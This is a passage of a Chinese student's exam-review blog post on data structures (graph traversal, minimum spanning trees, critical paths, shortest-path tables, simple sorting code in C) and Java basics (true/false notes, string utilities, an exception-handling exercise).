table><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/wps3.png" alt="img" loading="lazy"></p><h3 id="图"><a href="#图" class="headerlink" title="图"></a>图</h3><p>7、在图G的邻接表表示中，每个顶点邻接表中所含的结点数（即该顶点的链表结点），对于无向图来说等于该顶点的<strong><em>度</em></strong>；对于有向图来说等于该顶点的<strong><em>出度</em></strong>。</p><p>8、在有向图的邻接矩阵表示中，计算第I个顶点入度的方法是<strong><em>第I列非零元的个数</em></strong>。</p><h4 id="图的邻接矩阵和邻接表"><a href="#图的邻接矩阵和邻接表" class="headerlink" title="图的邻接矩阵和邻接表"></a>图的邻接矩阵和邻接表</h4><p>9、请用邻接矩阵和邻接表表示法画出下图G的存储结构。</p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/wps10.png" alt="img" loading="lazy"></p><p>邻接矩阵：<img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/wps11.png" alt="img" loading="lazy"></p><p>邻接表：</p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/wps12.png" alt="img" loading="lazy"></p><h4 id="深度优先遍历-DFS-和广度优先遍历-BFS"><a href="#深度优先遍历-DFS-和广度优先遍历-BFS" class="headerlink" title="深度优先遍历(DFS)和广度优先遍历(BFS)"></a>深度优先遍历(DFS)和广度优先遍历(BFS)</h4><p><strong>深度优先遍历(DFS)</strong>　<strong>在此我想用一句话来形容 “不到南墙不回头”。</strong></p><p>11、下面的邻接表表示一个给定的无向图，给出从顶点v4开始，对图用深度优先搜索法进行遍历时的顶点序列<strong><em>v4, v2, v1, v3, v5, v6</em></strong>；给出从顶点v4开始，对图用广度优先搜索法进行遍历时的顶点序列<strong><em>v4, v2, v3, v6, v1, v5</em></strong>。</p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/wps17-1609049024682.png" alt="img" loading="lazy"></p><p>图示为：<img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/wps18-1609049024683.png" alt="img" loading="lazy"></p><p>12、给出下图G：</p><p>（1）画出G的邻接表表示图；</p><p>（2）根据你画出的邻接表，以顶点1为根，画出G的深度优先生成树和广度优先生成树。</p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/wps31.png" alt="img" loading="lazy"></p><p>（1）邻接表表示图</p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/wps32.png" alt="img" loading="lazy"></p><p>（2）深度优先生成树为：</p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/wps33.png" alt="img" loading="lazy"></p><p>广度优先生成树为：</p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/wps34.png" alt="img" loading="lazy"></p><h4 id="最小生成树（普里姆算法和克鲁斯卡尔算法）"><a href="#最小生成树（普里姆算法和克鲁斯卡尔算法）" class="headerlink" title="最小生成树（普里姆算法和克鲁斯卡尔算法）"></a>最小生成树（普里姆算法和克鲁斯卡尔算法）</h4><p>13、<strong>Prim（普里姆）算法</strong>适用于求<strong><em>稠密图</em></strong>的网的最小生成树；<strong>Kruskal（克鲁斯卡尔）算法</strong>适用于求<strong><em>稀疏图</em></strong>的网的最小生成树。</p><p><strong>Prim（普里姆）算法：从某点出发遍历周围最小权值的边，直到遍历完所有点，边连线不能形成环</strong></p><p><strong>Kruskal（克鲁斯卡尔）算法：从权值最小的边开始，一直遍历最小权值的边，直到遍历完所有点，边连线不能形成环</strong></p><p>16、在拓扑分类中，拓扑序列的最后一个顶点必定是_<strong>出度为0</strong>_的顶点。</p><p><strong>拓扑排列，从出度为零的点开始选择</strong></p><h4 id="最短路径（过程）"><a href="#最短路径（过程）" class="headerlink" title="最短路径（过程）"></a>最短路径（过程）</h4><p>17、已知一图如下图所示：</p><p>（1）写出该图的两个拓扑排序（升序、降序）；</p><p>（2）以1为源点，4为终点，给出所有事件允许发生的最早时间和最晚时间，并给出关键路径；</p><p>（3）求顶点1到其余各顶点的最短路径。</p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/wps35.png" alt="img" loading="lazy"></p><p>（1）拓扑排序升序：1, 5, 6, 2, 7, 3, 8, 4；降序：1, 5, 6, 7, 8, 2, 3, 4</p><p>（2）关键路径</p><table><thead><tr><th>顶点</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th></tr></thead><tbody><tr><td>Ve</td><td>0</td><td>30</td><td>50</td><td>65</td><td>10</td><td>17</td><td>25</td><td>35</td></tr><tr><td>Vl</td><td>0</td><td>30</td><td>50</td><td>65</td><td>15</td><td>27</td><td>44</td><td>59</td></tr></tbody></table><p>关键路径为1, 2, 3, 4</p><p><strong>（3）最短路径：</strong></p><table><thead><tr><th>顶点集</th><th>D[2]</th><th>D[3]</th><th>D[4]</th><th>D[5]</th><th>D[6]</th><th>D[7]</th><th>D[8]</th><th>P[2]</th><th>P[3]</th><th>P[4]</th><th>P[5]</th><th>P[6]</th><th>P[7]</th><th>P[8]</th></tr></thead><tbody><tr><td>1</td><td>30</td><td>-1</td><td>60</td><td>10</td><td>-1</td><td>-1</td><td>-1</td><td>1</td><td>-1</td><td>1</td><td>1</td><td>-1</td><td>-1</td><td>-1</td></tr><tr><td>1,5</td><td>25</td><td>-1</td><td>60</td><td></td><td>17</td><td>-1</td><td>-1</td><td>5</td><td>-1</td><td>1</td><td></td><td>5</td><td>-1</td><td>-1</td></tr><tr><td>1,5,6</td><td>20</td><td>33</td><td>60</td><td></td><td></td><td>25</td><td>-1</td><td>6</td><td>6</td><td>1</td><td></td><td></td><td>6</td><td>-1</td></tr><tr><td>1,5,6,2</td><td></td><td>33</td><td>60</td><td></td><td></td><td>25</td><td>-1</td><td></td><td>6</td><td>1</td><td></td><td></td><td>6</td><td>-1</td></tr><tr><td>1,5,6,2,7</td><td></td><td>31</td><td>28</td><td></td><td></td><td></td><td>35</td><td></td><td>7</td><td>7</td><td></td><td></td><td></td><td>7</td></tr><tr><td>1,5,6,2,7,4</td><td></td><td>31</td><td></td><td></td><td></td><td></td><td>35</td><td></td><td>7</td><td></td><td></td><td></td><td></td><td>7</td></tr><tr><td>1,5,6,2,7,4,3</td><td></td><td></td><td></td><td></td><td></td><td></td><td>35</td><td></td><td></td><td></td><td></td><td></td><td></td><td>7</td></tr><tr><td>1,5,6,2,7,4,3,8</td><td>20</td><td>31</td><td>28</td><td>10</td><td>17</td><td>25</td><td>35</td><td>6</td><td>7</td><td>7</td><td>1</td><td>5</td><td>6</td><td>7</td></tr></tbody></table><p>注：1、表中未填项即是其上面那一项，因为已经找到了最短路径，故相应数组元素不再再修改；</p><p>2、未列D[1]和P[1]，值均为0，自己到自己。</p><p>18、已知一图如下图所示：</p><p>（1）写出该图的两个拓扑排序（升序、降序）；</p><p>（2）以0为源点，11为终点，计算出所有事件和活动的最早发生时间和最晚发生时间，并给出关键路径；</p><p>（3）求顶点1到其余各顶点的<strong>最短路径</strong>。</p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/wps36.png" alt="img" loading="lazy"></p><p>（1）拓扑排序升序：0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11；降序：0, 3, 4, 8, 2, 7, 10, 1, 5, 6, 9, 11</p><p>（2）关键路径</p><table><thead><tr><th>顶点</th><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>10</th><th>11</th></tr></thead><tbody><tr><td>Ve</td><td>0</td><td>2</td><td>2</td><td>4</td><td>9</td><td>5</td><td>9</td><td>7</td><td>12</td><td>13</td><td>13</td><td>20</td></tr><tr><td>Vl</td><td>0</td><td>4</td><td>2</td><td>5</td><td>10</td><td>7</td><td>9</td><td>9</td><td>13</td><td>13</td><td>14</td><td>20</td></tr></tbody></table><p>关键事件：0, 2, 6, 9, 11</p><table><thead><tr><th></th><th>a1</th><th>a2</th><th>a3</th><th>a4</th><th>a5</th><th>a6</th><th>a7</th><th>a8</th><th>a9</th><th>a10</th><th>a11</th><th>a12</th><th>a13</th><th>a14</th><th>a15</th><th>a16</th></tr></thead><tbody><tr><td>Ee</td><td>0</td><td>0</td><td>0</td><td>2</td><td>2</td><td>2</td><td>4</td><td>4</td><td>9</td><td>5</td><td>9</td><td>7</td><td>7</td><td>12</td><td>13</td><td>13</td></tr><tr><td>El</td><td>2</td><td>0</td><td>1</td><td>4</td><td>2</td><td>4</td><td>5</td><td>6</td><td>10</td><td>7</td><td>9</td><td>9</td><td>11</td><td>13</td><td>13</td><td>14</td></tr></tbody></table><p>关键活动为：a2, a5, a11, a15</p><p>故关键路径为：0, 2, 6, 9, 11</p><p><strong>（3）最短路径</strong></p><table><thead><tr><th>顶点集</th><th>0</th><th>0,1</th><th>0,1,2</th><th>0,1,2,3</th><th>0,1,2,3, 5</th><th>0,1,2,3, 5,6</th><th>0,1,2,3, 5,6,7</th><th>0,1,2,3, 5,6,7,4</th><th>0,1,2,3, 5,6,7,4, 10</th><th>0,1,2,3, 5,6,7,4, 10,9</th><th>0,1,2,3, 5,6,7,4, 10,9,8</th><th>0,1,2,3, 5,6,7,4, 10,9,8,11</th></tr></thead><tbody><tr><td>D[1]</td><td>2</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>2</td></tr><tr><td>D[2]</td><td>2</td><td>2</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>2</td></tr><tr><td>D[3]</td><td>4</td><td>4</td><td>4</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>4</td></tr><tr><td>D[4]</td><td>-1</td><td>-1</td><td>-1</td><td>9</td><td>9</td><td>9</td><td>9</td><td></td><td></td><td></td><td></td><td>9</td></tr><tr><td>D[5]</td><td>-1</td><td>5</td><td>5</td><td>5</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>5</td></tr><tr><td>D[6]</td><td>-1</td><td>-1</td><td>9</td><td>9</td><td>7</td><td></td><td></td><td></td><td></td><td></td><td></td><td>7</td></tr><tr><td>D[7]</td><td>-1</td><td>-1</td><td>7</td><td>7</td><td>7</td><td>7</td><td></td><td></td><td></td><td></td><td></td><td>7</td></tr><tr><td>D[8]</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>12</td><td>12</td><td>12</td><td></td><td>12</td></tr><tr><td>D[9]</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>11</td><td>11</td><td>11</td><td>11</td><td></td><td></td><td>11</td></tr><tr><td>D[10]</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>10</td><td>10</td><td></td><td></td><td></td><td>10</td></tr><tr><td>D[11]</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>16</td><td>16</td><td>16</td><td>16</td></tr><tr><td>P[1]</td><td>0</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>0</td></tr><tr><td>P[2]</td><td>0</td><td>0</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>0</td></tr><tr><td>P[3]</td><td>0</td><td>0</td><td>0</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>0</td></tr><tr><td>P[4]</td><td>-1</td><td>-1</td><td>-1</td><td>3</td><td>3</td><td>3</td><td>3</td><td></td><td></td><td></td><td></td><td>3</td></tr><tr><td>P[5]</td><td>-1</td><td>1</td><td>1</td><td>1</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>1</td></tr><tr><td>P[6]</td><td>-1</td><td>-1</td><td>2</td><td>2</td><td>5</td><td></td><td></td><td></td><td></td><td></td><td></td><td>5</td></tr><tr><td>P[7]</td><td>-1</td><td>-1</td><td>2</td><td>2</td><td>2</td><td>2</td><td></td><td></td><td></td><td></td><td></td><td>2</td></tr><tr><td>P[8]</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>4</td><td>4</td><td>4</td><td></td><td>4</td></tr><tr><td>P[9]</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>6</td><td>6</td><td>6</td><td>6</td><td></td><td></td><td>6</td></tr><tr><td>P[10]</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>7</td><td>7</td><td></td><td></td><td></td><td>7</td></tr><tr><td>P[11]</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>10</td><td>10</td><td>10</td><td>10</td></tr></tbody></table><p>注：本表是纵向计算，与书上相同。</p><h3 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h3><h3 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h3><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/image.png" alt="image" loading="lazy"></p><p>1.希尔排序：选择增量，并排序，比如5,2,1         基数排序：使用队列，从最低位起，按关键字的不同值将序列中的记录分配到RADIX个队列中</p><p>2.<strong>选择排序</strong>和<strong>归并排序</strong>不受关键字<strong>个数</strong>影响</p><p>3.稳定算法：<strong>直接插入，冒泡，归并和基数</strong> 排序</p><p><strong>直接插入排序</strong></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//核心代码</span><span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>N<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>temp<span class="token operator">=</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>j<span class="token operator">>=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">></span>temp<span class="token punctuation">)</span>a<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>a<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>             <span class="token keyword">else</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> a<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>temp<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>冒泡排序：即沉底或者冒头</strong></p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/image-20201227151453700.png" alt="image-20201227151453700" loading="lazy"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>N<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>N<span class="token operator">-</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">></span>a<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>temp<span class="token operator">=</span>a<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>a<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>a<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>a<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>temp<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>选择排序</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>N<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>N<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">&lt;</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>temp<span class="token operator">=</span>a<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>a<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>temp<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h1><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><pre class="line-numbers language-none"><code class="language-none">程序不能选择忽略事件。   错java 不能重写在超类中定义的静态方法构造方法可以是静态的数组中的元素可以不是是基元数据类型。比如指针,结构体型在Java 1.8中，“检查异常”必须在程序中处理。Java允许创建不规则数组，即Java多维数组中各行的列数可以不同。( )一个Java类可以不能有多个父类。声明为final的方法不能在子类中被覆盖。一个非抽象类不可以有选择地实现接口的部分抽象方法。    要实现所有，抽象类才能有选择受保护的数据或方法可以由任何包中的子类访问。受保护的数据或方法不可以由不同包中的任何类访问元注解不能用于注解Java程序中的类的成员方法。final类可以有实例，不能拓展子类和父类可以不在一个包中如果方法中发生必检异常，则必须捕获该异常或在其方法头中声明该异常。在Java程序中，不能使用protected来修饰一个类。抽象类是不能实例化的。类及其属性、方法可以同时有一个以上的修饰符来修饰。private 修饰的成员变量或方法的可见范围为当前类。 没有权限修饰符修饰的成员变量或方法的可见范围为当前包。 protected 修饰的成员变量或方法的可见范围是当前包及该类的子类，即可以被同一个包、该类的子类（可以不同包）的方法访问。 public修饰的成员变量或方法可以被所有包中所有类中的方法访问java应用程序经过编译后会产生一个以（.class ）为扩展名的字节码文件,Java应用程序源文件的扩展名为(java )。Java应用程序由若干个类所构成,这些类可以在一个源文件中,也可以分布在若干个源文件中,其中必须有一个源文件含有主类。sizeof不是java关键字abstract修饰抽象类抽象方法，抽象类一定要被继承，抽象方法一定要被重写自动转换次序.byte-&gt;short-&gt;int-&gt;long-&gt;float-&gt;double定义合法标识符规则： （1）由26个英文字母大小写，0-9 ，_或 $ 组成 （2）数字不可以开头。 （3）不可以使用关键字和保留字，但能包含关键字和保留字 （4）Java中严格区分大小写，长度无限制 （5）标识符不能包含空格class表示___类;类对象__; *.class表示___类文件___; *.java表示__java文件___; java文件编译后是___class;类__文件A.构造方法的主要作用是完成对类的对象的初始化工作B.构造方法的返回类型只能是void型，即在方法名前加void    错C.一般在创建新对象时，系统会自动调用构造方法D.构造方法是类的一种特殊方法，它的方法名必须与类名相同一个Java文件中可以定义有多个class声明，并且类名称可以与文件名称同名(1)final类不能实现任何接口。(2)public接口可以被任何一个类实现。(3)友好类和它所实现的接口必须在一个包里。(4)如果一个类和友好接口在同一个包里，就允许它实现该接口。  13错<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">switch</span><span class="token punctuation">(</span>变量<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>　　　　　　<span class="token keyword">case</span> 值<span class="token operator">:</span>要执行的语句<span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span>　　　　　　…　　　　　　<span class="token keyword">default</span><span class="token operator">:</span>要执行的语句<span class="token punctuation">;</span>　　　　<span class="token punctuation">&#125;</span><span class="token class-name">Scanner</span> num<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span>nextLine（）方法返回的是<span class="token class-name">Enter</span>键之前的所有字符，它是可以得到带空格的字符串的。next（）会自动消去有效字符前的空格，只返回输入的字符，不能得到带空格的字符串。    （简单点说，next我只要字，nextLine我啥都要）    <span class="token number">1.</span>十进制转成二进制<span class="token class-name">String</span> s <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">toBinaryString</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>  <span class="token comment">//将十进制数转成字符串，例如n=5 ，s = "101"</span><span class="token number">2.</span>将字符串转成整形<span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">valueof</span><span class="token punctuation">(</span><span class="token string">"1002"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//当然s只能是数字类的字符串</span>或者<span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token string">"1002"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">3.</span>将整形转成字符串<span class="token class-name">String</span> s <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueof</span><span class="token punctuation">(</span><span class="token number">1025</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  直接转成了 <span class="token number">4.</span>将整形转成十六进制的数<span class="token class-name">String</span> s <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">toHexString</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//输出结果12</span><span class="token number">1</span><span class="token function">isLetter</span><span class="token punctuation">(</span><span class="token punctuation">)</span>是否是一个字母<span class="token number">2</span><span class="token function">isDigit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>是否是一个数字字符<span class="token number">3</span><span class="token function">isWhitespace</span><span class="token punctuation">(</span><span class="token punctuation">)</span>是否是一个空白字符<span class="token number">4</span><span class="token function">isUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span>是否是大写字母<span class="token number">5</span><span class="token function">isLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span>是否是小写字母<span class="token number">6</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span>指定字母的大写形式<span class="token number">7</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span>指定字母的小写形式<span class="token number">8</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>返回字符的字符串形式，字符串的长度仅为<span class="token number">1</span>            <span class="token keyword">private</span> <span class="token class-name">String</span> value<span class="token punctuation">;</span>value<span class="token operator">=</span>value<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//转大写</span><span class="token keyword">private</span>  <span class="token class-name">String</span> word<span class="token punctuation">;</span>word<span class="token operator">=</span>word<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span>word<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//首字母大写，其他小写</span>word<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">//0开始到1分隔</span>                <span class="token class-name">String</span> s<span class="token operator">=</span>sc<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  输入<span class="token number">11</span><span class="token operator">:</span><span class="token number">20</span><span class="token class-name">String</span> x<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>s<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//通过":"分隔字符串,x[0]="11",x[1]="20"</span><span class="token keyword">int</span> a<span class="token operator">=</span><span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> b<span class="token operator">=</span><span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The BMI is %.4f"</span><span class="token punctuation">,</span>BMI<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//保留四位小数</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none"> &#x2F;&#x2F;异常 public static void main(String[] args) &#123;    Scanner sc &#x3D; new Scanner(System.in);    while (sc.hasNext()) &#123;        String choice &#x3D; sc.next();        try &#123;            if (choice.equals(&quot;number&quot;))                throw new NumberFormatException();            else if (choice.equals(&quot;illegal&quot;)) &#123;                throw new IllegalArgumentException();            &#125; else if (choice.equals(&quot;except&quot;)) &#123;                throw new Exception();            &#125; else            break;        &#125;        &#x2F;*这里放置你的答案*&#x2F;        catch(NumberFormatException e) &#123;        System.out.println(&quot;number format exception&quot;);        System.out.println(e);        &#125;        catch(IllegalArgumentException e) &#123;        System.out.println(&quot;illegal argument exception&quot;);        System.out.println(e);        &#125;        catch(Exception e) &#123;        System.out.println(&quot;other exception&quot;);        System.out.println(e);        &#125;    &#125;&#x2F;&#x2F;end while    sc.close();&#125;  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java">DAY_01<span class="token number">1.</span><span class="token class-name">Java</span>源代码（通过javac编译为）<span class="token operator">-></span>字节码文件<span class="token operator">-></span>执行并运行结果<span class="token number">2.D</span>OS 运行JAVA常见错误：文件名被隐藏——隐藏已知类型的扩展名 这个√取消javac <span class="token operator">+</span>文件名<span class="token operator">+</span>扩展名java<span class="token operator">+</span>类名 不带扩展名<span class="token number">3.</span>path环境变量配置作用：程序执行需要使用外部指令javac<span class="token 